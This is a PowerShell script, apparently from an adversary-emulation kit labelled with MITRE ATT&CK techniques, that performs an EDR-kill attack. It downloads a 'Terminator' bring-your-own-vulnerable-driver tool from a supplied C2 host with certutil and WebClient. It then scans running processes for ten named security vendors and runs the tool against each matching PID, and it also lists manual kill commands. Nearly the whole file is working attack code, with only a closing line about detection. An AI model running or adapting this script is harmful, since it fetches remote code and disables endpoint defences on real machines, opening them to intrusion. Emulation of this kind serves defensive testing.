param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting BYOVD - Terminator EDR Kill..." -ForegroundColor Cyan

# T1562.001 - Impair Defenses: Disable or Modify Tools
# "Terminator" is a BYOVD tool that uses signed drivers to kill EDR processes

Write-Host "[*] [T1562.001] Terminator BYOVD - EDR Process Termination" -ForegroundColor Yellow
Write-Host "[!] Terminator abuses legitimate signed kernel drivers to terminate EDR" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
$driverDir = "C:\temp\drivers"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
New-Item -ItemType Directory -Path $driverDir -Force | Out-Null

# Step 1: Download Terminator tool
Write-Host "`n[*] [T1105] Downloading Terminator tool..."
$terminatorPath = "$stagingDir\Terminator.exe"
certutil -urlcache -split -f "http://$C2Host/tools/Terminator.exe" $terminatorPath

if (-not (Test-Path $terminatorPath)) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/Terminator.exe", $terminatorPath)
    } catch {}
}

# Step 2: Enumerate all security processes
Write-Host "`n[*] [T1518.001] Enumerating security software..."
$edrPatterns = @{
    "Windows Defender" = "MsMpEng|MsSense|SenseIR|SenseCncProxy|SenseNdr"
    "CrowdStrike" = "CSFalconService|csfalconcontainer|CSFalcon"
    "SentinelOne" = "SentinelAgent|SentinelStaticEngine"
    "Carbon Black" = "cb|CbDefense|RepMgr"
    "Cylance" = "CylanceSvc|CylanceUI"
    "Cortex XDR" = "Traps|cortex|cyserver"
    "Tanium" = "TaniumClient|TaniumCX"
    "Sophos" = "SophosHealth|SophosCleanup|SophosFileScanner"
    "ESET" = "ekrn|egui"
    "Kaspersky" = "avp|kavtray"
}

Write-Host ""
$foundEdr = @()
foreach ($vendor in $edrPatterns.Keys) {
    $procs = Get-Process | Where-Object { $_.Name -match $edrPatterns[$vendor] }
    if ($procs) {
        Write-Host "    [!] $vendor DETECTED:" -ForegroundColor Red
        $procs | ForEach-Object {
            Write-Host "        PID $($_.Id) - $($_.Name)" -ForegroundColor Red
            $foundEdr += $_
        }
    } else {
        Write-Host "    [*] $vendor - Not detected" -ForegroundColor DarkGray
    }
}

if ($foundEdr.Count -eq 0) {
    Write-Host "`n    [!] No known EDR processes detected" -ForegroundColor Yellow
}

# Step 3: Attempt EDR termination
if (Test-Path $terminatorPath) {
    Write-Host "`n[*] [T1562.001] Executing Terminator..."
    foreach ($edrProc in $foundEdr) {
        Write-Host "    CMD: Terminator.exe -t $($edrProc.Id) ($($edrProc.Name))"
        & $terminatorPath -t $edrProc.Id 2>&1
    }
} else {
    Write-Host "`n[*] Terminator not available - showing manual kill methods:" -ForegroundColor Yellow
    Write-Host "    Method 1: taskkill /F /PID <pid>  (usually blocked by EDR)"
    Write-Host "    Method 2: wmic process where processid=<pid> delete"
    Write-Host "    Method 3: BYOVD driver + kernel callback removal"
}

# Step 4: Verify EDR status
Write-Host "`n[*] Checking Windows Defender service status..."
$defenderSvc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($defenderSvc) {
    Write-Host "    Windows Defender: $($defenderSvc.Status)"
}

$senseSvc = Get-Service Sense -ErrorAction SilentlyContinue
if ($senseSvc) {
    Write-Host "    Microsoft Defender for Endpoint: $($senseSvc.Status)"
}

Write-Host "`n[+] Terminator EDR Kill Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Security product tampering, service stop attempts, BYOVD driver loading" -ForegroundColor Yellow
